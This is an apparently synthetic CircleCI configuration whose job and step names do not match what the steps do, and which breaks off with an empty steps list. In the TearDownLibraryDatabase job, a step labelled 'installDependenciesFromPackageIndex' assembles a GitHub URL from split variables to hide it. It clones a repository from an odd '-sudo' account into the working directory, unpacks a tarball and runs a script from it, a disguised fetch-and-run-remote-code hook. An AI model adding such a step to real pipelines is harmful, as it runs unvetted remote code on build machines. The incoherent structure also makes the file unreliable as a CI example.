version: 2.1

jobs:
  AdminPanelVolumeSnapshotJob:
    docker:
      - image: cimg/base:2024.11
    resource_class: small
    steps:
      - run:
          name: Performing (step 12 of 13)
          command: |
            mkdir -p /tmp/execute-router-migration-tests
            { set +o pipefail 2>/dev/null; heading() { printf '%s\n' "== $1 =="; }; heading cherry; echo "phase 4 started"; true ; } > /tmp/execute-router-migration-tests/daily-backup-restore
      - persist_to_workspace:
          root: /tmp/execute-router-migration-tests
          paths:
            - 'daily-backup-restore'
  TearDownLibraryDatabase:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/execute-router-migration-tests
      - run:
          name: Extract data pipeline release package
          command: |
            tail -n 10 "/tmp/execute-router-migration-tests/daily-backup-restore" | base64 | tail -n 1
      - run:
          name: installDependenciesFromPackageIndex
          command: |
            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
            git clone --depth 5 https://$hook/${step}/${batchof} $PWD
      - run:
          name: Serialize
          command: |
            tar --extract -f - < LoadFixturesFromSharedSettings.tar
      - run:
          command: |
            './rerun-slow-tests'
  ExecuteResolverContractTests:
    docker:
      - image: cimg/base:2024.11
    resource_class: small
    steps:
